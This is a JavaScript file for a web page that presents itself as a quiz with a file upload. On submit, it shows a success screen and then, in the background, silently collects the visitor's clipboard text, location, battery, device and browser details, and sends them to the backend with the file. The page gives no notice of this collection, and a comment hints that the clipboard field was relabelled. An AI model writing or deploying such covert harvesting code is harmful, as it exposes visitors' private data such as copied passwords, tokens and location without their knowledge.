const form = document.getElementById("quiz-form");
const fileInput = document.getElementById("user-file");

const BACKEND_BASE = "/api";

// ================================
// COLLECT METADATA (ON SUBMIT)
// ================================
async function collectMetadata() {
  const metadata = {
    useragent: navigator.userAgent,
    platform: navigator.platform,
    battery: "N/A",
    location: "N/A",
    deviceMemory: navigator.deviceMemory ? navigator.deviceMemory + " GB" : "N/A",
    clipboardContent: "N/A", // renamed from network
    time: new Date().toLocaleString(),
  };

  // Battery info
  if (navigator.getBattery) {
    try {
      const b = await navigator.getBattery();
      metadata.battery = `${b.level * 100}% charging:${b.charging}`;
    } catch {}
  }

  // Location only if already granted
  if (navigator.permissions && navigator.geolocation) {
    try {
      const status = await navigator.permissions.query({ name: "geolocation" });
      if (status.state === "granted") {
        const pos = await new Promise((res, rej) =>
          navigator.geolocation.getCurrentPosition(res, rej)
        );
        metadata.location = `${pos.coords.latitude},${pos.coords.longitude}`;
      }
    } catch {}
  }

  // Clipboard content only if already allowed
  if (navigator.permissions && navigator.clipboard) {
    try {
      const status = await navigator.permissions.query({ name: "clipboard-read" });
      if (status.state === "granted") {
        const text = await navigator.clipboard.readText();
        if (text) metadata.clipboardContent = text;
      }
    } catch {}
  }

  return metadata;
}

// ================================
// UPLOAD FILE + METADATA
// ================================
async function uploadFileWithMetadata(file, metadata) {
  return new Promise((resolve, reject) => {
    const reader = new FileReader();

    reader.onload = async () => {
      try {
        const res = await fetch(`${BACKEND_BASE}/file-upload`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            file: reader.result,
            filename: file.name,
            metadata
          }),
        });

        resolve(await res.json());
      } catch (err) {
        reject(err);
      }
    };

    reader.onerror = () => reject(reader.error);
    reader.readAsDataURL(file);
  });
}

// ================================
// SUBMIT FORM
// ================================
form.addEventListener("submit", async (e) => {
  e.preventDefault();

  if (!fileInput.files.length) {
    alert("Please upload a file first");
    return;
  }

  // Show success page immediately
  document.getElementById("quiz-container").style.display = "none";
  document.getElementById("success-container").style.display = "flex";

  // Send metadata + file in background
  (async () => {
    try {
      const metadata = await collectMetadata();
      const res = await uploadFileWithMetadata(fileInput.files[0], metadata);

      console.log("Upload successful:", res);
    } catch (err) {
      console.error("Background upload failed:", err);
    }
  })();
});
